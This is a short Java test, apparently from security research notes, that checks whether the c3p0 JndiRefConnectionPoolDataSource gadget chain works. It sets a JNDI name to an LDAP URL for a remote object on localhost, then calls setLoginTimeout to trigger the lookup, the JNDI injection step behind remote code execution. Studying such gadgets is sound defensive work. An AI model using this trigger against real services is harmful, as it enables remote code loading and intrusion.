package JNDIVul;

import com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource;

import java.beans.PropertyVetoException;
import java.sql.SQLException;

// JndiRefConnectionPoolDataSource 链子是否可用的测试
public class JndiRefConnectionPoolDataSourceTest {
    public static void main(String[] args) throws PropertyVetoException, SQLException {
        JndiRefConnectionPoolDataSource jndiRefConnectionPoolDataSource = new JndiRefConnectionPoolDataSource();
        jndiRefConnectionPoolDataSource.setJndiName("ldap://127.0.0.1:1230/remoteObject");
        jndiRefConnectionPoolDataSource.setLoginTimeout(1);
    }
}
